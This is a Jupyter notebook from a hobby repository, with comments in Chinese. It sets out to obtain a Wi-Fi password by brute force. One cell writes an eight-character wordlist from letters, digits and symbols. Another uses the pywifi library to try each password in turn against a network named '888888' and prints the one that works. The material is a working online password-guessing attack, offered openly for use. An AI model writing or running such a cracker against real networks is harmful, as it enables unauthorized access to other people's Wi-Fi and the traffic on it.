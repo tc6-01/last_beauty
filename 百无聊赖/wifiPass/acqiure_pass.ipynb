{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "### docisfy\n",
    "\"\"\"\n",
    "    to acquire the wifi password to have some convient way to learn\n",
    "    just easy and i'll try my best to get it\n",
    "\"\"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Help on package pywifi:\n",
      "\n",
      "NAME\n",
      "    pywifi - pywifi - a cross-platform wifi library.\n",
      "\n",
      "DESCRIPTION\n",
      "    \n",
      "    This library is made for manipulating wifi device on varient platforms.\n",
      "\n",
      "PACKAGE CONTENTS\n",
      "    _wifiutil_linux\n",
      "    _wifiutil_win\n",
      "    const\n",
      "    iface\n",
      "    profile\n",
      "    wifi\n",
      "\n",
      "FUNCTIONS\n",
      "    set_loglevel(level=0)\n",
      "\n",
      "FILE\n",
      "    c:\\users\\86147\\appdata\\roaming\\python\\python39\\site-packages\\pywifi\\__init__.py\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import pywifi\n",
    "help(pywifi)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import itertools as its\n",
    "\n",
    "# 自定义密码生成\n",
    "words = \"1234567890abcdefghijklmnopqrstuvwxyz!@#$%&*?.\"\n",
    "\n",
    "# 生成密码本的位数，五位数，repeat=5 自定义密码位数\n",
    "r = its.product(words, repeat = 8)\n",
    "\n",
    "# 保存在文件中，追加\n",
    "dic = open(\"./password.txt\", \"a\")\n",
    "\n",
    "# i是元组\n",
    "for i in r:\n",
    "    # jion空格链接\n",
    "    dic.write(\"\".join(i))\n",
    "    dic.write(\"\".join(\"\\n\"))\n",
    "    print(\"正在生成密码......\")\n",
    "dic.close()\n",
    "print(\"密码本已生成\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pywifi\n",
    "from pywifi import const # 引入一个常量\n",
    "import time\n",
    "\n",
    "def wifiConnect(wifiname,wifipassword):\n",
    "    wifi = pywifi.PyWiFi()\n",
    "    ifaces = wifi.interfaces()[0]\n",
    "    # 断开连接\n",
    "    ifaces.disconnect()\n",
    "    time.sleep(0.5)\n",
    "    if ifaces.status() == const.IFACE_DISCONNECTED:\n",
    "        # 创建WiFi连接文件\n",
    "        profile = pywifi.Profile()\n",
    "        # WiFi名称\n",
    "        profile.ssid = wifiname\n",
    "        # WiFi密码\n",
    "        profile.key = wifipassword\n",
    "        # WiFi的加密算法\n",
    "        profile.akm.append(const.AKM_TYPE_WPA2PSK)\n",
    "        # 网卡的开放\n",
    "        profile.auth = const.AUTH_ALG_OPEN\n",
    "        # 加密单元\n",
    "        profile.cipher = const.CIPHER_TYPE_CCMP\n",
    "\n",
    "        # 删除所有的WiFi文件\n",
    "        ifaces.remove_all_network_profiles()\n",
    "        # 设定新的连接文件\n",
    "        tep_profile = ifaces.add_network_profile(profile)\n",
    "\n",
    "        # 连接WiFi\n",
    "        ifaces.connect(tep_profile)\n",
    "        time.sleep(3)\n",
    "        if ifaces.status() == const.IFACE_CONNECTED:\n",
    "            return True\n",
    "        else:\n",
    "            return False\n",
    "\n",
    "def read_password():\n",
    "    '''读取密码本'''\n",
    "    print('开始破解：')\n",
    "    path = 'D:\\超级密码本.txt'\n",
    "    file = open(path, 'r') # 以只读的方式\n",
    "\n",
    "    while True:\n",
    "        try:\n",
    "        \t# 按行读取密码本\n",
    "            wifipwd = file.readline()\n",
    "            # 第一个参数是指定 WiFi 名称，第二个参数是读取的密码\n",
    "            bool = wifiConnect('888888', wifipwd)\n",
    "            if bool:\n",
    "                print('密码正确：' + wifipwd)\n",
    "                break\n",
    "            else:\n",
    "                print('密码错误：' + wifipwd)\n",
    "        except:\n",
    "            continue\n",
    "    # 关闭资源\n",
    "    file.close()\n",
    "\n",
    "# 调用方法\n",
    "read_password()\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.9.2 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.2"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "11938c6bc6919ae2720b4d5011047913343b08a43b18698fd82dedb0d4417594"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
